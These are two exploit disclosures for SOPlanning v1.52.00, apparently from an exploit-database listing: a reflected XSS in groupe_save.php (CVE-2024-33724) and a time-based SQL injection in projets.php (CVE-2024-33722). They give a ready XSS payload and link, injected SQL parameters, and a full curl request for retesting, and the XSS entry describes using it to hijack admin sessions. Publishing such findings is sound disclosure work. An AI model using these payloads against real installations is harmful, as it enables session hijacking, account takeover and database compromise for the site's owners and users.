Exploit Title: SOPlanning v1.52.00 'groupe_save.php' XSS (Reflected XSS)

Application: SOPlanning

Version: 1.52.00

Date: 4/22/24

Exploit Author: Joseph McPeters (Liquidsky)

Vendor Homepage: https://www.soplanning.org/en/

Software Link: https://sourceforge.net/projects/soplanning/

Tested on: Linux

CVE: CVE-2024-33724

Exploit: https://github.com/fuzzlove/soplanning-1.52-exploits/blob/main/soplanning-XSS-README.txt

Description: SOPlanning v1.52.00 is vulnerable to XSS via the 'groupe_id' parameters a remote unautheticated attacker can hijack the admin account or other users. The remote attacker can hijack a users session or credentials and perform a takeover of the entire platform.

Example Payload:
"><script>alert('LiQUiDSKY')</script><!--

Reflected XSS Link: /soplanning/www/process/groupe_save.php?saved=1&groupe_id="><script>alert('LiQUiDSKY')</script><!--&nom=Project+New

Analysis: The landing page takes into consideration the user input parameter then redirects to a page where the XSS is shown the payload included in the exploit escapes the variable where it is held and comments out the rest to perform a valid reflected XSS attack against any authenticated user including the admin.


----------------------------------------------------------------------------------------------------------------------


Exploit Title: SOPlanning v1.52.00 'projets.php' SQLi

Application: SOPlanning

Version: 1.52.00

Date: 4/22/24

Exploit Author: Joseph McPeters (Liquidsky aka fuzzlove)

Vendor Homepage: https://www.soplanning.org/en/

Software Link: https://sourceforge.net/projects/soplanning/

Tested on: Linux

CVE: CVE-2024-33722

Exploit: https://github.com/fuzzlove/soplanning-1.52-exploits/blob/main/soplanning-sqli-README.txt

Description: SOPlanning v1.52.00 is vulnerable to Authenticated SQL Injection via the 'projects.php' page.

Instructions: Authenticate to the host, the credentials can be obtained using a CSRF exploit (more info included). Once valid credentials are obtained use either a GET/POST request to send the valid parameters that equal to valid SQLi.

Vulnerable request parameters for request to "/www/projets.php":

filtreGroupeProjet=1&statut[]=todo'+AND+(SELECT+8073+FROM+(SELECT(SLEEP(10)))PuxA)+AND+'Liquidsky'='Liquidsky&rechercheProjet=test

The above parameters can be sent as either a valid GET/POST request to trigger the SQLi.
Example Curl Request To Re-Test SQLi:

curl -i -s -k -X $'POST' \
    -H $'Host: 127.0.0.1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 130' -H $'Origin: http://127.0.0.1' -H $'Connection: close' -H $'Referer: http://127.0.0.1/soplanning/www/projets.php' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' \
    -b $'dateDebut=23/04/2024; dateFin=23/06/2024; xposMoisWin=0; xposJoursWin=0; yposMoisWin=0; yposJoursWin=0; yposProjets=33; PHPSESSID=ovpbclvbc87uh7anfbq2luf9bi; soplanningplanning_=hhrtf0rgs562vm8rhn5i641481; baseLigne=users; baseColonne=jours; afficherTableauRecap=1; masquerLigneVide=0; statut_projet=%5B%22abort%22%2C%22archive%22%2C%22done%22%2C%22progress%22%2C%22todo%22%5D' \
    --data-binary $'filtreGroupeProjet=1&statut[]=todo\'+AND+(SELECT+8073+FROM+(SELECT(SLEEP(10)))PuxA)+AND+\'Liquidsky\'=\'Liquidsky&rechercheProjet=test' \
    $'http://127.0.0.1/soplanning/www/projets.php'


  Note: Cookies need to be authenticated and request needs to be valid for valid SQLi. This curl request can be used with a proxy to reconstruct a valid request.
